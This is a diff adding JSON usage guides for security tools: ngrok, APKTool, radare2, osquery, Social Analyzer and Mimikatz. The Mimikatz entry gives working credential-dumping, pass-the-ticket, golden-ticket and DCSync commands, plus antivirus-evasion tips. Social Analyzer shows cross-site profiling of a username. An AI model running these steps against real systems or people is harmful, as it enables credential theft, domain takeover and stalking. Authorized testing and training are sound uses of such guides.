+              "command": "ngrok http 3000 --cidr-allow=1.2.3.4/32"
+            }
+          ],
+          "notes": "ngrok tunnels bypass firewalls and NAT by design. In a corporate environment, outbound ngrok connections may violate security policy. Defenders should monitor for ngrok domains in DNS logs."
+        }
+      ]
+    },
+    {
+      "slug": "apktool",
+      "title": "How to Install and Use APKTool",
+      "description": "This guide covers installing APKTool and using it to decompile, modify, and rebuild Android APK files.",
+      "prerequisites": [
+        "Java 8+",
+        "An APK file to analyze"
+      ],
+      "steps": [
+        {
+          "title": "Install APKTool",
+          "description": "Install APKTool from your package manager or download the jar.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install apktool"
+            },
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install apktool"
+            },
+            {
+              "label": "Verify",
+              "command": "apktool --version"
+            }
+          ]
+        },
+        {
+          "title": "Decompile an APK",
+          "description": "Decode an APK into its components - smali code, resources, manifest, and assets.",
+          "commands": [
+            {
+              "label": "Decompile",
+              "command": "apktool d target.apk -o output/"
+            },
+            {
+              "label": "What you get",
+              "command": "ls output/\n# AndroidManifest.xml  - App permissions and components\n# res/                 - Decoded resources (layouts, strings, images)\n# smali/               - Dalvik bytecode in smali format\n# assets/              - Raw asset files"
+            }
+          ],
+          "notes": "APKTool decodes to smali (Dalvik assembly), not Java. Use JADX if you want Java source. APKTool is better when you need to modify and rebuild the APK."
+        },
+        {
+          "title": "Analyze the Manifest",
+          "description": "The AndroidManifest.xml reveals permissions, activities, services, receivers, and exported components.",
+          "commands": [
+            {
+              "label": "View manifest",
+              "command": "cat output/AndroidManifest.xml | grep -E 'permission|activity|service|receiver|exported'"
+            }
+          ],
+          "notes": "Look for exported components (exported=true) - these are accessible to other apps and are common attack surfaces. Excessive permissions are also a red flag."
+        },
+        {
+          "title": "Modify and Rebuild",
+          "description": "Make changes to the decompiled APK and rebuild it.",
+          "commands": [
+            {
+              "label": "Rebuild",
+              "command": "apktool b output/ -o modified.apk"
+            },
+            {
+              "label": "Sign the APK",
+              "command": "keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000\njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore test.keystore modified.apk test"
+            }
+          ],
+          "notes": "Rebuilt APKs must be signed to install on a device. The signature won't match the original, so apps with signature verification will detect the modification."
+        }
+      ]
+    },
+    {
+      "slug": "radare2",
+      "title": "How to Install and Use Radare2",
+      "description": "This guide covers installing Radare2 and using it for binary analysis, disassembly, and reverse engineering from the command line.",
+      "prerequisites": [
+        "Linux, macOS, or Windows",
+        "A binary to analyze"
+      ],
+      "steps": [
+        {
+          "title": "Install Radare2",
+          "description": "Install r2 from package manager or build from source for the latest version.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install radare2"
+            },
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install radare2"
+            },
+            {
+              "label": "Verify",
+              "command": "r2 -v"
+            }
+          ]
+        },
+        {
+          "title": "Open and Analyze a Binary",
+          "description": "Open a binary in r2 and run analysis to identify functions, strings, and cross-references.",
+          "commands": [
+            {
+              "label": "Open binary",
+              "command": "r2 ./binary"
+            },
+            {
+              "label": "Run full analysis",
+              "command": "aaa"
+            },
+            {
+              "label": "List functions",
+              "command": "afl"
+            },
+            {
+              "label": "List strings",
+              "command": "iz"
+            }
+          ],
+          "notes": "The 'aaa' command runs all analysis passes. It takes a moment but gives you the most complete picture. 'afl' lists all identified functions with their sizes."
+        },
+        {
+          "title": "Navigate and Disassemble",
+          "description": "Move through the binary and view disassembly.",
+          "commands": [
+            {
+              "label": "Seek to main",
+              "command": "s main"
+            },
+            {
+              "label": "Print disassembly",
+              "command": "pdf"
+            },
+            {
+              "label": "Seek to address",
+              "command": "s 0x00401000"
+            },
+            {
+              "label": "Visual mode",
+              "command": "VV"
+            }
+          ],
+          "notes": "VV enters visual graph mode showing control flow. Press 'p' to cycle through views, 'q' to quit visual mode. Visual mode is much easier to navigate than raw commands."
+        },
+        {
+          "title": "Search for Patterns",
+          "description": "Search for strings, bytes, and code patterns in the binary.",
+          "commands": [
+            {
+              "label": "Search string",
+              "command": "/ password"
+            },
+            {
+              "label": "Search hex bytes",
+              "command": "/x 9090909090"
+            },
+            {
+              "label": "Cross-references to current function",
+              "command": "axt @@ fcn.*"
+            }
+          ]
+        },
+        {
+          "title": "Useful Commands Cheatsheet",
+          "description": "Essential r2 commands for everyday use.",
+          "commands": [
+            {
+              "label": "Quick reference",
+              "command": "# aaa - analyze all\n# afl - list functions\n# pdf - print disassembly of function\n# iz - list strings\n# VV - visual graph mode\n# s addr - seek to address\n# / string - search for string\n# axt addr - cross-references to address\n# px 64 - print 64 bytes hex dump\n# ? - help for any command prefix"
+            }
+          ],
+          "notes": "Radare2 has a steep learning curve but is incredibly powerful once you learn the commands. Every command can be followed by '?' for help (e.g., 'a?' shows all analysis commands)."
+        }
+      ]
+    },
+    {
+      "slug": "osquery",
+      "title": "How to Install and Use osquery",
+      "description": "This guide covers installing osquery and using SQL queries to inspect your system's processes, network connections, users, and security state.",
+      "prerequisites": [
+        "Linux, macOS, or Windows"
+      ],
+      "steps": [
+        {
+          "title": "Install osquery",
+          "description": "Install osquery from the official packages.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install osquery"
+            },
+            {
+              "label": "Debian/Ubuntu",
+              "command": "sudo apt install osquery"
+            },
+            {
+              "label": "Launch interactive shell",
+              "command": "osqueryi"
+            }
+          ]
+        },
+        {
+          "title": "Your First Queries",
+          "description": "Query your system like a database. Each table represents a different aspect of the OS.",
+          "commands": [
+            {
+              "label": "Running processes",
+              "command": "SELECT name, pid, path, cmdline FROM processes ORDER BY start_time DESC LIMIT 20;"
+            },
+            {
+              "label": "Listening ports",
+              "command": "SELECT p.name, l.port, l.address, l.protocol FROM listening_ports l JOIN processes p ON l.pid = p.pid;"
+            },
+            {
+              "label": "Logged-in users",
+              "command": "SELECT user, host, time FROM logged_in_users;"
+            }
+          ]
+        },
+        {
+          "title": "Security Queries",
+          "description": "Queries specifically useful for security monitoring and incident response.",
+          "commands": [
+            {
+              "label": "Find processes running from /tmp",
+              "command": "SELECT name, path, pid FROM processes WHERE path LIKE '/tmp/%' OR path LIKE '/var/tmp/%';"
+            },
+            {
+              "label": "Check for crypto miners",
+              "command": "SELECT name, path, cmdline FROM processes WHERE cmdline LIKE '%stratum%' OR cmdline LIKE '%minerd%' OR name LIKE '%xmrig%';"
+            },
+            {
+              "label": "Recently modified files in sensitive dirs",
+              "command": "SELECT path, mtime, size FROM file WHERE directory IN ('/etc/cron.d', '/etc/cron.daily') AND mtime > (strftime('%s','now') - 86400);"
+            }
+          ]
+        },
+        {
+          "title": "Network Investigation",
+          "description": "Query network connections, DNS, and ARP tables.",
+          "commands": [
+            {
+              "label": "Active connections",
+              "command": "SELECT p.name, p.pid, s.remote_address, s.remote_port, s.state FROM process_open_sockets s JOIN processes p ON s.pid = p.pid WHERE s.remote_port != 0 AND s.state = 'ESTABLISHED';"
+            },
+            {
+              "label": "ARP table",
+              "command": "SELECT * FROM arp_cache;"
+            }
+          ],
+          "notes": "The process_open_sockets + processes join is one of the most useful queries for incident response - it shows you exactly which process is talking to which remote address."
+        },
+        {
+          "title": "Schedule Queries (Daemon Mode)",
+          "description": "Run osquery as a daemon that executes queries on a schedule and logs the results.",
+          "commands": [
+            {
+              "label": "Start daemon",
+              "command": "sudo osqueryd --config_path /etc/osquery/osquery.conf"
+            },
+            {
+              "label": "Example config",
+              "command": "# /etc/osquery/osquery.conf:\n# {\n#   \"schedule\": {\n#     \"suspicious_processes\": {\n#       \"query\": \"SELECT * FROM processes WHERE path LIKE '/tmp/%'\",\n#       \"interval\": 300\n#     }\n#   }\n# }"
+            }
+          ],
+          "notes": "In daemon mode, osquery runs scheduled queries and logs differential results (only new/changed rows). This is how it's used for continuous endpoint monitoring at scale."
+        }
+      ]
+    },
+    {
+      "slug": "social-analyzer",
+      "title": "How to Install and Use Social Analyzer",
+      "description": "This guide covers installing Social Analyzer and using it to find and analyze social media profiles across hundreds of platforms.",
+      "prerequisites": [
+        "Python 3.6+",
+        "pip"
+      ],
+      "steps": [
+        {
+          "title": "Install Social Analyzer",
+          "description": "Install from pip.",
+          "commands": [
+            {
+              "label": "pip",
+              "command": "pip install social-analyzer"
+            },
+            {
+              "label": "Verify",
+              "command": "social-analyzer --help"
+            }
+          ]
+        },
+        {
+          "title": "Search for a Username",
+          "description": "Search for a username across all supported platforms.",
+          "commands": [
+            {
+              "label": "CLI search",
+              "command": "social-analyzer -t username --method find"
+            },
+            {
+              "label": "With specific platforms",
+              "command": "social-analyzer -t username --method find --websites github twitter instagram linkedin"
+            }
+          ]
+        },
+        {
+          "title": "API Mode",
+          "description": "Run Social Analyzer as a web API for integration with other tools.",
+          "commands": [
+            {
+              "label": "Start API server",
+              "command": "social-analyzer -t username --method find --api"
+            },
+            {
+              "label": "Access at",
+              "command": "# http://localhost:8001"
+            }
+          ],
+          "notes": "API mode is useful for integrating Social Analyzer into automated OSINT pipelines or custom investigation dashboards."
+        },
+        {
+          "title": "Output and Reporting",
+          "description": "Save results in different formats.",
+          "commands": [
+            {
+              "label": "JSON output",
+              "command": "social-analyzer -t username --method find --output json > results.json"
+            },
+            {
+              "label": "HTML report",
+              "command": "social-analyzer -t username --method find --output html"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "mimikatz",
+      "title": "How to Install and Use Mimikatz",
+      "description": "This guide covers downloading Mimikatz and using it to extract credentials from Windows memory during authorized penetration tests.",
+      "prerequisites": [
+        "Windows (target system)",
+        "Administrator/SYSTEM privileges",
+        "Authorization to test the target system"
+      ],
+      "steps": [
+        {
+          "title": "Obtain Mimikatz",
+          "description": "Download Mimikatz from the official GitHub repository. Note that antivirus will flag it.",
+          "commands": [
+            {
+              "label": "Download",
+              "command": "# Download from https://github.com/gentilkiwi/mimikatz/releases\n# Extract zip\n# Run mimikatz.exe from an admin command prompt"
+            },
+            {
+              "label": "Or build from source",
+              "command": "# Clone https://github.com/gentilkiwi/mimikatz\n# Open mimikatz.sln in Visual Studio\n# Build Release x64"
+            }
+          ],
+          "notes": "Every AV product detects mimikatz. In real engagements, operators often compile from source with modifications, use Invoke-Mimikatz (PowerShell), or dump LSASS memory and analyze it offline. For lab practice, add an AV exclusion."
+        },
+        {
+          "title": "Elevate Privileges",
+          "description": "Mimikatz needs debug privileges to access LSASS process memory.",
+          "commands": [
+            {
+              "label": "Enable debug privilege",
+              "command": "privilege::debug"
+            },
+            {
+              "label": "Check it worked",
+              "command": "# Should output: Privilege '20' OK"
+            }
+          ],
+          "notes": "This requires running as Administrator. If you get 'ERROR kuhl_m_privilege_simple', you don't have sufficient privileges."
+        },
+        {
+          "title": "Dump Credentials",
+          "description": "Extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory.",
+          "commands": [
+            {
+              "label": "Dump all credentials",
+              "command": "sekurlsa::logonpasswords"
+            },
+            {
+              "label": "Dump NTLM hashes",
+              "command": "lsadump::sam"
+            },
+            {
+              "label": "Dump cached domain credentials",
+              "command": "lsadump::cache"
+            }
+          ],
+          "notes": "logonpasswords shows credentials for all logged-in users. On older Windows versions (pre-2012), you'll often get plaintext passwords. On newer versions, you get NTLM hashes which can be cracked or used in pass-the-hash attacks."
+        },
+        {
+          "title": "Kerberos Attacks",
+          "description": "Extract and manipulate Kerberos tickets for lateral movement.",
+          "commands": [
+            {
+              "label": "List Kerberos tickets",
+              "command": "kerberos::list"
+            },
+            {
+              "label": "Export tickets",
+              "command": "kerberos::list /export"
+            },
+            {
+              "label": "Pass the ticket",
+              "command": "kerberos::ptt ticket.kirbi"
+            },
+            {
+              "label": "Golden ticket (requires krbtgt hash)",
+              "command": "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"
+            }
+          ],
+          "notes": "Golden tickets give you unrestricted access to every service in the domain. This requires the krbtgt account hash, which you can get after compromising a domain controller with lsadump::dcsync."
+        },
+        {
+          "title": "DCSync Attack",
+          "description": "Replicate credentials from a domain controller remotely, without touching the DC's disk.",
+          "commands": [
+            {
+              "label": "DCSync specific user",
+              "command": "lsadump::dcsync /domain:corp.local /user:Administrator"
+            },
+            {
+              "label": "DCSync all users",
+              "command": "lsadump::dcsync /domain:corp.local /all /csv"
+            }
+          ],
+          "notes": "DCSync requires Domain Admin or Replication rights. It simulates a domain controller requesting password replication, pulling NTLM hashes without needing to log into the DC. This is the cleanest way to extract domain credentials."
+        }
+      ]
+    }
+  ]
+}
